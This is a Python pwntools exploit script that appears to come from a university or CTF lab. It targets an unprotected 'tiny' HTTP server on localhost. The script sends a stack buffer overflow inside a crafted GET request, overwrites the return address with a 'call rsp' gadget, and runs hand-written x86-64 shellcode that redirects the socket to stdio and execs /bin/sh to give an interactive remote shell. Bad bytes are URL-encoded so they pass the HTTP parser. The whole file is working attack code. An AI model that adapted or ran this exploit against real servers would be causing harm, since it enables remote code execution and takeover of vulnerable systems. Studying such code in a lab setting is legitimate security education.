from IPython import embed
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny' # no protections

def package_http_request(path):
    """Craft the bytes for a valid HTTP/1.1 GET request containing our payload """
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])

def c(comment):
    """this is just a dummy function to insert comments in the asm string"""
    return ""


def run_expl():
    p = remote(ADDR, PORT)
    # p.clean()

    e = ELF(local_file)
    context.binary = e
    context.log_level = "info"
    # libc = e.libc
    # libc.address = libc_base

    shellcode_payload = f"""

      {c("----------------------------------------")}
      {c("print a marker string to test the socket")}
      {c("----------------------------------------")}
      mov rax, 0x343262696d696e75 {c("string unimib24")}
      push rax
      push rsp
      pop rsi      {c("pointer to the string")}

      xor rax, rax
      mov al, 0x1  {c("write syscall")}
      xor rdi, rdi
      mov dil, 0x4 {c("stdout fd")}
      xor rdx, rdx
      mov dl, 0x8  {c("size")}
      syscall

      {c("----------------------------------------")}
      {c("Redirect this fork's stdIO to the socket")}
      {c("----------------------------------------")}

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 0    {c("new fd")}
      syscall

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 1    {c("new fd")}
      syscall

      mov rax, 0x21 {c("dup2 syscall")}
      mov rdi, 4    {c("old fd")}
      mov rsi, 2    {c("new fd")}
      syscall

      {c("----------------------------------------")}
      {c("exec /bin/sh, transforming this fork    ")}
      {c("----------------------------------------")}

      mov rax, 0x0068732f6e69622f {c("string /bin/sh")}
      push rax
      push rsp
      pop rdi       {c("pointer to the string")}

      mov rax, 0x3b {c("execve syscall")}
      push 0
      push rsp
      pop rsi       {c(" *const *argv")}
      mov rdx, rsi  {c(" *const *envp")}
      syscall
    """

    shellcode_bytes = asm(shellcode_payload)
    print("shellcode bytes:")
    print(shellcode_bytes)

    # buffer overflow
    padding_size = 0x230       # tiny no-protections
    expl = b''
    expl += b'a'*padding_size
    expl += b'b'*8             # overwrite rbp
    expl += p64(0x4283fb)      # gadget: call rsp;
    expl += shellcode_bytes

    #url encode all the bytes that would block the http parser
    expl = expl.replace(b'%', b'%25')
    expl = expl.replace(b'\x00', b'%00')
    expl = expl.replace(b'\x20', b'%20')
    expl = expl.replace(b'\x0a', b'%0a')
    expl = expl.replace(b'\x0d', b'%0d')
    http_req = package_http_request(expl)
    p.send(http_req)
    print("sent these request bytes:")
    print(http_req)

    out = p.recvuntil(b'File not found')
    print(out)

    success_marker = p.recvuntil(b'unimib24', timeout=1)
    if not success_marker:
        print("exploitation failed")
        out = p.clean(timeout=1)
        print(out)
        p.close()
    else:
        print("remote shell started! type a command")
        p.interactive()

run_expl()
